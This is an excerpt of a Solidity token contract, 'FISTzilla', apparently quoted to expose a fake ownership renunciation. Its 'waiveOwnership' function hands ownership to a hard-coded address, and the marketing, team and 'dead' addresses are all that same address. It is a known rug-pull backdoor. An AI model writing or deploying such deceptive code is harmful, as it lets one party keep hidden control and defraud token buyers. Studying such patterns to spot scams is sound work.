...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x5A21072dABa542499Ecc7865e9C617A8Fc07fc81));
        _owner = address(0x5A21072dABa542499Ecc7865e9C617A8Fc07fc81);
    }
...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "FISTzilla";
    string private _symbol = "FISTzilla";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5A21072dABa542499Ecc7865e9C617A8Fc07fc81);
    address payable public teamWalletAddress = payable(0x5A21072dABa542499Ecc7865e9C617A8Fc07fc81);
    address public immutable deadAddress = 0x5A21072dABa542499Ecc7865e9C617A8Fc07fc81;
